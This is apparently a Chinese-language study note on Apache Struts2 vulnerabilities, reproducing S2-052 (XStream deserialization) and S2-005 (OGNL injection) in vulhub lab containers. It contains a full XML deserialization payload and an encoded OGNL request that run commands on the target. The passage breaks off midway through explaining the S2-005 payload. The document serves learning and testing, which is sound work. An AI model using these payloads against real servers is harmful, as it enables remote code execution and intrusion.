# Struts2

> [盘点：史上最全Struts 2漏洞复现过程及PoC合集 - 安全内参 | 决策者的网络安全知识库 (secrss.com)](https://www.secrss.com/articles/24780)

Struts2 历史版本归档可在 [Index of /dist/struts --- /dist/struts 的索引 (apache.org)](https://archive.apache.org/dist/struts/) 找到, 对于后续分析具体版本的漏洞比较有帮助

---

## Struts2 框架简介

> [Apache Struts 2 - 维基百科，自由的百科全书 (wikipedia.org)](https://zh.wikipedia.org/wiki/Apache_Struts_2)
>
> ----
>
> [答应我别学ssh了！在职程序员苦心地劝阻_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1fJ411J7H7/?spm_id_from=333.880.my_history.page.click&vd_source=bb4d7b2841dd4d0035c93d44ba5cf11a)
>
> ---
>
> [Struts2漏洞频出 祸根是Apache底层代码不严谨_中小企业_比特网 (archive.org)](https://web.archive.org/web/20140819083306/http://smb.chinabyte.com/426/12937426.shtml)
>
> [struts2高危漏洞或引发互联网安全灾难-网络安全专区 (it168.com)](https://safe.it168.com/a2013/0718/1509/000001509368.shtml)

**Apache Struts 2**是一个用于开发 Java EE 网络应用程序的开放源代码网页应用程序架构。它利用并延伸了 Java Servlet API，鼓励开发者采用 MVC 架构。

Struts2的作用是提供了一种简洁、灵活、可扩展的Web开发解决方案，它可以帮助开发者减少重复代码，提高开发效率，封装常用功能，实现MVC的分层架构。

通俗来讲, Struts 的作用就是完成 MVC 模型中 Controller 的功能, 用于接受请求与处理

十年前比较流行的 SSH 框架中就用到了 Struts, SSH 在那个 Java 后端框架并不那么繁荣的年代发挥了巨大的作用, 而目前 Java 后端领域则基本上被 Spring 系列框架所统一

![image-20230601080350811](http://cdn.ayusummer233.top/DailyNotes/202306010803847.png)

---

目前新项目已经很少会见到 Struts 了, 原因包括但不限于

- Struts 很多做法与写法耦合性比较强, 不够优雅, 太过繁琐
- Struts 性能一直不是很好, 内存损耗比较大, 不适合高流量的业务
- Struts 爆出了很多高危漏洞

Struts2开发组常被指漏洞修复手法不妥，要么修复后仍有可利用，要么无法修复并长期闲置。

其中 S2-003 报告引发了一连串的远程执行问题，官方多次修复仍没能完全解决，甚至是报告提交者多次提交其绕过方案警醒开发组注意。

> S2-003 是 Apache Struts2 的一个早期漏洞，其编号对应于 Struts2 的官方漏洞列表。这个漏洞主要涉及到 Struts2 对 OGNL 表达式的处理问题。OGNL (Object-Graph Navigation Language) 是一个强大的表达式语言，Struts2 框架用来支持表单元素的动态绑定和表达式求值。
>
> S2-003 的问题主要出在 Struts2 框架处理参数绑定时过度信任了用户输入的情况。攻击者可以通过构造恶意的 OGNL 表达式，使得在参数解析阶段就执行了这些表达式从而可能导致 RCE
>
> 然而，尽管对 S2-003 的修复阻止了直接利用，但是 Struts2 框架的 OGNL 支持在之后的版本中仍然出现了多个漏洞
>
> 例如 s2-005(CVE-2008-6504) 以及 s2-009(CVE-2011-1772) 则是对 s2-003 修复的方法的绕过
>
> 除此之外 Struts2 的很多漏洞还都可以导致 RCE, 例如 S2-005，S2-009，S2-013，S2-015，S2-016，S2-019，S2-032，S2-045，S2-046，S2-048，S2-052，S2-057

---

## Struts2 漏洞复现环境简单搭建方法

对于 Struts2 漏洞的复现而言, 最简单的环境搭建方法是利用 vulhub 提供的 docker 镜像来搭建环境

![image-20230608055406000](http://cdn.ayusummer233.top/DailyNotes/202306080554067.png)

```bash
# 在 ubuntu 22.04 上安装最新版本的 docker
curl -s https://get.docker.com/ | sh
# 启动 docker service
systemctl start docker
```

> PS:Windows可以直接在官网下载可执行程序进安装 docker
>
> 自 2022 年 4 月起， `docker compose` 作为子命令合并到 Docker 中，作为 Docker Compose V2，Python 版本的 docker-compose 将在 2023 年 6 月之后弃用。因此，Vulhub 将不再需要安装额外的 `docker-compose` ，并且所有文档都将被修改为使用 `docker compose` 。

```bash
# 使用 git + ghproxy 代理拉取 vulhub 项目
git clone https://ghproxy.com/https://github.com/vulhub/vulhub.git
```

clone 完仓库后进入相应的漏洞目录下可以看到 README 文档且一般有中文文档, 例如:

![image-20230608060159957](http://cdn.ayusummer233.top/DailyNotes/202306080601999.png)

可以安装文档中的提示搭建该漏洞的环境, 以及参照文档中的 POC&&EXP 复现该漏洞


---

## Struts2 的运行流程

> [S2-052 - 桃木剑的博客 | Taomujian Blog](https://taomujian.github.io/2021/05/14/S2_052/)

<img src="http://cdn.ayusummer233.top/DailyNotes/202306071502707.png" alt="img" style="zoom:200%;" />

- Action是 Struts2 的一个核心组件，它表示应用程序的一个独立的功能或业务逻辑单元。在很多情况下，一个Action可以被视为一个请求处理器，它会处理用户发送过来的HTTP请求，并返回一个结果。

  每个Action通常由以下几部分组成：

  - 业务逻辑：这是Action的核心部分，代表了一个特定功能的实现。比如，用户登录就可能对应一个包含了验证用户名和密码的Action。
  - 输入属性：这些属性通常从HTTP请求中提取，并用于在执行业务逻辑时作为输入参数。
  - 输出属性：这些属性用于存储业务逻辑执行的结果，比如一个查询操作的结果。它们将会被放入模型对象中，并在视图层用于展示。
  - 结果类型：这表示了Action处理完请求后的结果类型，通常是一个表示视图的字符串（如"success"、"error"等）。Struts 2根据这个结果类型来选择哪个视图（JSP页面或其他）应该被用于响应用户。

  实际上，任何实现了Action接口的Java类都可以作为Struts2的一个Action。Action接口只定义了一个方法：`execute()`，该方法用于封装要执行的业务逻辑，并返回一个字符串表示的结果类型。

- `HttpServletRequest`对象表示客户端到服务器的HTTP请求，它包含请求行（例如GET或POST方法，URL，HTTP版本），头部字段（例如Host，User-Agent，Accept-Language等），以及可选的消息主体。

  在Struts2框架中，`HttpServletRequest`对象可以在一个Action类或结果页面中使用，以获取关于客户端请求的信息。例如，可以使用`HttpServletRequest`对象获取客户端提交的表单数据，获取HTTP头部信息，或者获取关于客户端的会话信息。

- `ActionMapper` 是一个用来将浏览器的HTTP请求映射到特定Action的组件。它处理的是从请求中获取哪一个Action和哪一个方法的问题。

  Struts2中的Action是用来处理业务逻辑的主要组件，每一个Action类通常对应一个业务操作。而ActionMapper负责决定请求将交给哪个Action来处理。也就是说，它在URI和Action之间建立映射。

  HTTP请求经过一系列的标准过滤器(Filter)组件链(这些拦截器可以是Struts2 自带的,也可以是用户自定义的

  FilterDispatcher主要是通过ActionMapper来决定需要调用哪个Action

- `FilterDispatcher` 是一个关键组件，它是 Java Servlet API 中的一个过滤器，用于拦截所有请求并将它们转发给适当的 Action 处理。

  具体来说，`FilterDispatcher` 在其 `doFilter()` 方法中执行以下步骤：

  1. 通过 ActionMapper 查找请求 URI 来找到适当的 Action 和方法。
  2. 调用 Action 的方法并获取结果。
  3. 将结果转发到适当的视图（通常是 JSP 页面）。

- `ActionProxy`是一个核心组件，用于封装和管理对Action的引用以及该Action的执行环境。它负责路由请求到正确的Action，并协调一些关键的交互过程。

  以下是`ActionProxy`的一些主要功能：

  1. 路由请求：`ActionProxy`通过解析请求URI并匹配相应的Action配置来决定应该路由到哪个Action。它会使用一个`ActionMapper`实例来完成这个任务。
  2. 管理拦截器：`ActionProxy`还负责管理拦截器链，这是一组在执行Action方法之前和之后运行的拦截器。这些拦截器可以添加跨越多个Action的公共行为，如验证、日志记录、异常处理等。
  3. 执行Action：`ActionProxy`最终会调用Action的适当方法，并获取该方法返回的结果代码。结果代码之后用于确定应该呈现哪个视图（通常是一个JSP页面）。
  4. 存储执行环境：`ActionProxy`还存储了一些与当前请求相关的环境信息，如Action的名称，命名空间，方法名等。

  `ActionProxy`是Struts2框架的中心控制器，负责处理Action的执行和拦截器链的管理。

- Interceptor（拦截器）是一个用来实现跨切面（cross-cutting）关注点的重要组件。跨切面关注点是指那些分布在应用程序中多个模块或功能中的共享功能，例如日志记录、事务管理、安全性检查、数据验证等。

  Struts2的拦截器工作在Action的处理过程中，当一个请求到来并匹配到某个Action时，这个请求首先会经过一个由拦截器组成的拦截器栈（Interceptor Stack）。每一个拦截器在请求到达Action之前（前处理）和请求完成返回之后（后处理）都有机会进行操作。

  例如，一个认证拦截器可能会在前处理阶段检查用户是否已经登录，如果没有，它可能会重定向到登录页面而不是继续执行Action。同样，一个日志拦截器可能在后处理阶段记录Action的执行时间。

  总的来说，Interceptor在Struts2中是一个非常强大的功能，它提供了一种可重用、模块化的方式来实现跨越多个Action的共享功能，增强了代码的可维护性和可扩展性。

- Action是一个核心组件，它表示应用程序的一个独立的功能或业务逻辑单元。在很多情况下，一个Action可以被视为一个请求处理器，它会处理用户发送过来的HTTP请求，并返回一个结果。

  每个Action通常由以下几部分组成：

  - 业务逻辑：这是Action的核心部分，代表了一个特定功能的实现。比如，用户登录就可能对应一个包含了验证用户名和密码的Action。
  - 输入属性：这些属性通常从HTTP请求中提取，并用于在执行业务逻辑时作为输入参数。
  - 输出属性：这些属性用于存储业务逻辑执行的结果，比如一个查询操作的结果。它们将会被放入模型对象中，并在视图层用于展示。
  - 结果类型：这表示了Action处理完请求后的结果类型，通常是一个表示视图的字符串（如"success"、"error"等）。Struts 2根据这个结果类型来选择哪个视图（JSP页面或其他）应该被用于响应用户。

  实际上，任何实现了Action接口的Java类都可以作为Struts 2的一个Action。Action接口只定义了一个方法：`execute()`，该方法用于封装要执行的业务逻辑，并返回一个字符串表示的结果类型。

  同时，Struts 2提供了一个叫做 ActionSupport 的基类，这个类实现了Action接口，还提供了一些额外的功能如输入验证和国际化支持。因此，很多时候我们会让我们的Action类继承自 ActionSupport 类。

---

## s2-052 - CVE-2017-9805 - Struts2 REST插件远程执行命令漏洞

> [S2-052 - Apache Struts 2 Wiki - Apache Software Foundation --- S2-052 - Apache Struts 2 Wiki - Apache 软件基金会](https://cwiki.apache.org/confluence/display/WW/S2-052)
>
> 包含手工环境搭建: [Struts2-052漏洞学习及反弹shell试验 - 简书 (jianshu.com)](https://www.jianshu.com/p/72c8492064c9)
>
> [Index of /dist/struts/2.5.12 (apache.org)](https://archive.apache.org/dist/struts/2.5.12/)
>
> [S2-052 - 桃木剑的博客 | Taomujian Blog](https://taomujian.github.io/2021/05/14/S2_052/)

当 Struts2 使用 REST 插件使用 XStream 的实例 `xstreamhandler` 处理反序列化XML有效载荷时没有进行任何过滤，可以导致RCE

攻击者可以利用该漏洞构造恶意的XML内容获取服务器权限。

---

Struts2-rest-plugin 是一个用于在 Struts2 框架中开发 RESTful web services 的插件。

> REST，即表示性状态传递，是一种软件架构风格，它的核心是将 Web 应用程序视为资源的集合，可以通过 URL 来定位，并通过 HTTP 方法（如 GET，POST，PUT，DELETE 等）进行操作。

Struts2-rest-plugin 提供了对 RESTful 架构风格的支持，使得开发者能在 Struts2 框架中创建符合 REST 风格的 Web 服务。例如，开发者可以使用此插件来定义资源，并将这些资源与 HTTP 方法关联起来，使得客户端可以通过 HTTP 方法操作这些资源。

Struts2-rest-plugin 还提供了对常见数据格式（如 XML 和 JSON）的序列化和反序列化支持，这使得 Struts2 构建的 Web 服务可以以多种数据格式与客户端进行交互。

---

该漏洞的影响范围为: 

- Struts 2.3.x全系版本(根据实际测试，2.3版本也存在该漏洞)
- Struts 2.5 - Struts 2.5.12

> [Index of /dist/struts/2.5.10 (apache.org)](https://archive.apache.org/dist/struts/2.5.10/)

---

该漏洞成因在于 REST plugin 在处理 xml 类型的请求数据时没有任何类型的过滤, 因此可以构造恶意的 xml 数据进行不安全的反序列化, 从而达到 RCE

`struts2-rest-plugin` 是使 Struts2 实现 REST API 的插件, 它通过`Content-Type`或URI后缀名来识别不同的请求数据类型，然后根据请求数据类型用不同的实现类去处理。关键代码如下：

`struts-plugin.xml`: `struts2-rest-plugin` 插件添加了 `ContentTypeInterceptor`:

![image-20230607141745857](http://cdn.ayusummer233.top/DailyNotes/202306071417912.png)

`org/apache/struts2/rest/DefaultContentTypeHandlerManager.java`: 根据 `Content-Type` 或 URI 的后缀名来识别请求类型

![image-20230607142625575](http://cdn.ayusummer233.top/DailyNotes/202306071426644.png)

![image-20230607143244120](http://cdn.ayusummer233.top/DailyNotes/202306071432196.png)

`org/apache/struts2/rest/ContentTypeInterceptor.java`:  遇到 xml 请求体时选择 `XStreamHandler` 对 xml 请求数据进行处理:

![image-20230607143835375](http://cdn.ayusummer233.top/DailyNotes/202306071438445.png)

![image-20230607143915937](http://cdn.ayusummer233.top/DailyNotes/202306071439005.png)

`org/apache/struts2/rest/handler/XStreamHandler.java`:  调用 `Xtream.fromXML` 方法对请求数据进行反序列化:

![image-20230607134758077](http://cdn.ayusummer233.top/DailyNotes/202306071347126.png)

![image-20230607144805017](http://cdn.ayusummer233.top/DailyNotes/202306071448076.png)

---

### fromXML

> [回顾XStream反序列化漏洞-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/204314)
>
> [XStream 源码解析 - 简书 (jianshu.com)](https://www.jianshu.com/p/387c568faf62)

`XStream` 是一个简单的库，用于序列化对象为 XML，并从 XML 反序列化为对象。

`Xstream.fromXML` 能够将 XML 转化成 Java 对象, 简单来说就是:

1. **创建 XStream 实例**：首先，需要创建一个 XStream 实例。这个实例将用于执行所有的序列化和反序列化操作。
2. **注册转换器**：XStream 使用一系列的转换器（Converter）来完成对象与 XML 之间的转换。默认情况下，XStream 会注册一系列默认的转换器，用于处理常见的 Java 类型。如果需要处理特殊的类型，可以手动注册新的转换器。
3. **解析 XML**：XStream 会将输入的 XML 字符串解析成一个 DOM 树。
4. **根据 DOM 树创建对象**：XStream 会遍历 DOM 树，并使用注册的转换器将每个 XML 节点转换成相应的 Java 对象。
5. **处理对象引用**：为了处理可能存在的对象引用，XStream 在创建对象的过程中，会记录每个创建的对象以及它在 XML 中的位置。当遇到一个引用时，XStream 会查找之前记录的对象，而不是创建一个新的对象。
6. **返回结果**：最后，XStream 返回从 XML 字符串中创建的对象。由于反序列化过程通常是递归进行的，因此这个结果通常是从 DOM 树的根节点开始创建的对象。

> 由于 XStream 可以反序列化任意的 XML 字符串，如果 XML 字符串来自不可信的来源，那么可能会存在安全风险，因为攻击者可能会创建一个特制的 XML 字符串，导致在反序列化过程中执行恶意代码。

具体步骤如下:

1. 把 `String` 转化成 `StringReader`

   `HierarchicalStreamDriver` 通过 `StringReader` 创建 `HierarchicalStreamReader`

   最后调用 `MarshallingStrategy` 的 `unmarshal` 方法开始解组

   ```java
   fromXML(final String xml)
   fromXML(new StringReader(xml)); 
   unmarshal(hierarchicalStreamDriver.createReader(xml), root);
   final T t = (T)marshallingStrategy.unmarshal(root, reader, dataHolder, converterLookup, mapper);
   ```

2. `marshallingStrategy` 创建出 `TreeUnmarshaller` 来并启动解析

   ```java
   final TreeUnmarshaller context = createUnmarshallingContext(root, reader, converterLookup, mapper);
   //start转化
   context.start(dataHolder);
   ```

3. 开始组码(`TreeUnmarshaller` 的 `start` 方法)

   ```java
   public Object start(final DataHolder dataHolder) {
           this.dataHolder = dataHolder;
           //通过mapper获取对应节点的Class对象
           final Class<?> type = HierarchicalStreams.readClassType(reader, mapper);
           //Converter根据Class的类型转化成java对象
           final Object result = convertAnother(null, type);
           for (final Runnable runnable : validationList) {
               runnable.run();
           }
           return result;
       }
   ```

4. 通过节点名获取 `Mapper` 中对应的 `Class`

   ```java
   public static Class<?> readClassType(final HierarchicalStreamReader reader, final Mapper mapper) {
           if (classAttribute == null) {
           // 通过节点名获取Mapper中对应的Class
           Class<?> type = mapper.realClass(reader.getNodeName());
           return type;
       }
   ```

5. 根据 Class 把它转化成对应的 java 对象 (`TreeUnmarshaller.convertAnother` )

   ```java
   public Object convertAnother(final Object parent, Class<?> type, Converter converter) {
           //根据mapper获取type的正确类型
           type = mapper.defaultImplementationOf(type);
           if (converter == null) {
               //根据type找到对应的converter
               converter = converterLookup.lookupConverterForType(type);
           } else {
               if (!converter.canConvert(type)) {
                   final ConversionException e = new ConversionException("Explicitly selected converter cannot handle type");
                   e.add("item-type", type.getName());
                   e.add("converter-type", converter.getClass().getName());
                   throw e;
               }
           }
            // 进行把type转化成对应的object
           return convert(parent, type, converter);
       }
   ```

6. 查找对应的 Converter (`ConverterLookup.lookupConverterForType` )

   ```java
   public Converter lookupConverterForType(final Class<?> type) {
           // 先从缓存集合中查找Converter
           final Converter cachedConverter = type != null ? typeToConverterMap.get(type.getName()) : null;
           if (cachedConverter != null) {
               return cachedConverter;
           }
           // 遍历converters找到符合的Converter
           for (final Converter converter : converters) {
                   if (converter.canConvert(type)) {
                       if (type != null) {
                           把找到的放入缓存集合中
                           typeToConverterMap.put(type.getName(), converter);
                       }
                       return converter;
                   }
           }
       }
   ```

7. 根据找到的 Converter 把 Type 转化成 java 对象(`TreeUnmarshaller.convert`)

   ```java
   protected Object convert(final Object parent, final Class<?> type, final Converter converter) {
               //调用converter unmarshal进行组码
               return converter.unmarshal(reader, this);
   }
   ```

8. 组码的过程，如当 Class 对应的 Converter 为 `AbstractReflectionConverter` 时，根据获取的对象，继续读取子节点，并转化成对象对应的变量。

   ```java
   public Object unmarshal(final HierarchicalStreamReader reader, final UnmarshallingContext context) {
           // 创建class的instance
           Object result = instantiateNewInstance(reader, context);
           //执行组码
           result = doUnmarshal(result, reader, context);
           return serializationMembers.callReadResolve(result);
       }
   
   protected Object instantiateNewInstance(final HierarchicalStreamReader reader, final UnmarshallingContext context) {
               //创建class的instance
               return reflectionProvider.newInstance(context.getRequiredType());
       }
   
   public Object doUnmarshal(final Object result, final HierarchicalStreamReader reader,
               final UnmarshallingContext context) {
       //读取里面所有的节点
        while (reader.hasMoreChildren()) {
               reader.moveDown();
               //获取class中的变量
               Object field = reflectionProvider.getFieldOrNull(fieldDeclaringClass, fieldName);
               //判断了class中的变量的类型
               final String classAttribute = HierarchicalStreams.readClassAttribute(reader, mapper);
               if (classAttribute != null) {
                    type = mapper.realClass(classAttribute);
               } else {
                    type = mapper.defaultImplementationOf(field.getType());
                         }
               //读取class中的变量的值
               value = unmarshallField(context, result, type, field);
               //把变量的值赋值给Class的实例
               reflectionProvider.writeField(result, fieldName, value, field.getDeclaringClass());
     }
   }
   ```

9. 获取 Class 变量的值过程同 5 到 8，是一个循环过程，直到读取到最后一个节点退出循环。最终获取到 java 对象中的变量值也都设置，整个 XML 解析过程就结束了。

   ```java
   protected Object unmarshallField(final UnmarshallingContext context, final Object result, final Class<?> type,
               final Field field) {
           // Converter根据Class的类型转化成对象
           return context.convertAnother(result, type, mapper.getLocalConverter(field.getDeclaringClass(), field
               .getName()));
       }
   ```

---

XStream 反序列化同  fastjson 这种不一样的地方是 fastjson 会在反序列化的时候主动去调用 getters 和 setters，而 XStream 的反序列化过程中赋值都有 Java 的反射机制来完成，所以并没有这样主动调用的特性。

---

> [mbechler/marshalsec --- (github.com)](https://github.com/mbechler/marshalsec)
>
> [内网Nextcloud/marshalsec](http://10.182.235.11/index.php/f/68018)

在了解了上述流程后可以使用 `marshalsec(Github/mbechler/marshalsec)` 来构建反序列化 payload

 ```bash
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream ImageIO "touch" "/tmp/success"
 ```

![image-20230608071644254](http://cdn.ayusummer233.top/DailyNotes/202306080716285.png)

这个 payload 利用了类 `javax.crypto.NullCipher` 和类 `java.lang.ProcessBuilder`。工作原理如下：

1. XML 中的 `<map>` 和 `<entry>` 标签用于构造一个 Java `Map` 对象，其中的键和值都是 `jdk.nashorn.internal.objects.NativeString` 对象，这个对象是 JDK 的内部类，用于表示 JavaScript 中的字符串。
2. 对象 `com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data` 包含一个 `javax.crypto.CipherInputStream` 类型的对象。`CipherInputStream` 类实现了 `java.io.InputStream` 接口，它的 `read` 方法会被调用，从而触发漏洞。
3. `javax.crypto.NullCipher` 类是一个空的 `Cipher` 实现，它没有任何加密或解密功能，但是可以用于触发反序列化链。
4. `javax.imageio.spi.FilterIterator` 类是一个实现了 `java.util.Iterator` 接口的类，它的 `hasNext` 和 `next` 方法会被调用，从而触发漏洞。
5. `java.lang.ProcessBuilder` 类是 Java 的一个核心类，用于创建和运行新的进程。这个类在 `FilterIterator` 的 `next` 字段中，所以 `ProcessBuilder` 的 `start` 方法会被调用，运行 `touch /tmp/success` 命令。

> [回顾XStream反序列化漏洞-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/204314#h3-11)

---

在靶机侧使用 vulhub 启动 s2-052 环境

```bash
# 从 vulhub 仓库根目录进入 s2-052 目录
cd struts2/s2-052
# 使用 docker 启动环境(可以修改同级目录下的 docker-compose.yml 文件以更改端口映射行为, 默认 8080:8080)
docker compose up -d
```

访问靶机 8080 端口 web 服务可以看到如下页面:

![image-20230608072835892](http://cdn.ayusummer233.top/DailyNotes/202306080728916.png)

任意编辑一条数据, 并使用 BurpSuit 抓包:

![image-20230608072903599](http://cdn.ayusummer233.top/DailyNotes/202306080729622.png)

![image-20230608072933452](http://cdn.ayusummer233.top/DailyNotes/202306080729503.png)

可以拦截到如下请求:

```http
POST /orders/3 HTTP/1.1
Host: 192.168.1.215:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: http://192.168.1.215:8080
Connection: close
Referer: http://192.168.1.215:8080/orders/3/edit
Cookie: JSESSIONID=C17E36303D6104B8D716519372F13B56
Upgrade-Insecure-Requests: 1

_method=put&clientName=Bob_test&amount=33
```

修改 `Content-Type` 为 `application/xml` 并将上面构造好的新建 `/tmp/success` 的 payload 贴在请求体中

```http
POST /orders/3/edit HTTP/1.1
Host: 192.168.1.215:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/xml
Content-Length: 2415

<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>touch</string>
                        <string>/tmp/success</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
```

可以先进入 docker 容器的 `/tmp` 目录瞅一眼

![image-20230608073504920](http://cdn.ayusummer233.top/DailyNotes/202306080735948.png)

> 或者用 VSCode 的 Docker + DevContainer 插件可以使用 VSCode 打开容器
>
> ![image-20230608073634019](http://cdn.ayusummer233.top/DailyNotes/202306080736058.png)

发送构造好的恶意请求

![image-20230608073652110](http://cdn.ayusummer233.top/DailyNotes/202306080736154.png)

然后回看 docker 容器 `/tmp` 目录, 可以看到多出了一个 success 文件

![image-20230608073723901](http://cdn.ayusummer233.top/DailyNotes/202306080737920.png)

![image-20230608073745615](http://cdn.ayusummer233.top/DailyNotes/202306080737645.png)

---


### s2-005 - CVE-2010-1870 RCE

S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003。

----

OGNL 是 Object-Graph Navigation Language 的缩写，它是一个强大的表达式语言，用于获取和设置 Java 对象的属性。在 Apache Struts2 框架中，OGNL 用于数据传输和表达式求值。

OGNL 能做什么：

1. 访问对象的属性：OGNL 可以通过 . 运算符访问对象的属性。例如，对于一个名为 `user` 的对象，我们可以通过 `user.name` 获取其 `name` 属性的值。
2. 调用方法：OGNL 也可以调用对象的方法。例如，`user.getName()` 就可以调用 `user` 对象的 `getName()` 方法。
3. 操作集合：OGNL 提供了丰富的语法来操作集合对象，包括列表、映射和数组。
4. 执行条件和循环：OGNL 还支持 if/else 表达式、for 循环等控制结构。

在 Struts2 中，OGNL 的功能非常强大，不仅可以用于数据绑定，还可以用于表单验证、流程控制等。

然而，Struts2 中 OGNL 的使用也带来了一些安全问题。因为 OGNL 可以调用任意的 Java 方法，所以如果开发者没有正确地限制 OGNL 表达式的执行，攻击者可能会通过构造恶意的 OGNL 表达式，执行任意代码或访问敏感数据。这就是导致 Struts2 中多个 OGNL 注入漏洞的原因。

---

在 s2-003 中, struts2 会将 http 的每个参数名解析为 OGNL 语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上

---

```bash
# 从 vulhub 仓库根目录进入 s2-005 目录
cd struts2/s2-005
# 使用 docker 启动环境(可以修改同级目录下的 docker-compose.yml 文件以更改端口映射行为, 默认 8080:8080, 这里改成了 8081:8080)
docker compose build
docker compose up -d
```

此时访问靶机 8081 端口的 web 服务可以看到如下页面:

![image-20230608164057182](http://cdn.ayusummer233.top/DailyNotes/202309141817123.png)

尝试向该页面发送一个 GET 请求并使用 OGNL 表达式来关闭安全配置并向靶机 `/tmp` 目录写入一个 `success` 文件

```http
GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
Host: 192.168.1.215:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36

```

![image-20230608151032083](http://cdn.ayusummer233.top/DailyNotes/202309141817673.png)

![image-20230608151317539](http://cdn.ayusummer233.top/DailyNotes/202309141817362.png)

1. 首先通过设置`#_memberAccess['allowStaticMethodAccess']`为`true`来启用静态方法访问。

   `(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true`

   > OGNL 的解析机制比较宽松，不会因为一个表达式的解析失败就停止解析其他表达式。在这个例子中，由于 `('%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)` 并非一个方法，因此后面跟着的 `(vaaa)` 并没有被当作方法参数进行解析。这种特性被用来增加混淆程度，使得这个 payload 更不容易被人类阅读和理解，同时也更不容易被一些自动化的安全检测工具识别。

2. 然后创建一个新的Boolean对象，并将它的值设为`false`，然后将它赋值给`#context['xwork.MethodAccessor.denyMethodExecution']`，以此来禁止Xwork框架阻止方法执行。

   ```java
   (aaaa)(
       (%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)		
       (%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22))
   )
   
   ####
   (aaaa)(     
       ('#context['xwork.MethodAccessor.denyMethodExecution']=#vccc')
       (#vccc=new java.lang.Boolean("false")) 
   )
   ```

   - `(%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)` 这部分的作用是在 OGNL 上下文（context）中设置 `'xwork.MethodAccessor.denyMethodExecution'` 属性的值为 `#vccc`，其中 `#vccc` 是一个 OGNL 变量。
   - `(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22))` 这部分的作用是设置 `#vccc` 变量的值为 `new Boolean("false")`。实际上，这就相当于将 `'xwork.MethodAccessor.denyMethodExecution'` 的值设置为 `false`。

   这两步操作实际上是绕过了 Struts2 的安全限制。Struts2 通过 `'xwork.MethodAccessor.denyMethodExecution'` 这个属性来阻止 OGNL 表达式调用方法，其默认值为 `true`，即默认禁止调用方法。但是这段 payload 通过设置其值为 `false`，从而允许 OGNL 表达式调用方法，这样就可以通过 OGNL 表达式执行任意 Java 方法，导致远程代码执行漏洞。

   至于前面的 `(aaaa)` 则是一个无效的表达式，和前面提到的 `(vaaa)` 类似，它并没有实际的作用，只是增加了 payload 的混淆程度。

3. 获取到Runtime对象，并将这个对象赋值给`#rt`, 然后通过`#rt`来调用Runtime对象的exec方法，执行系统命令。

   ```java
   (asdf)(
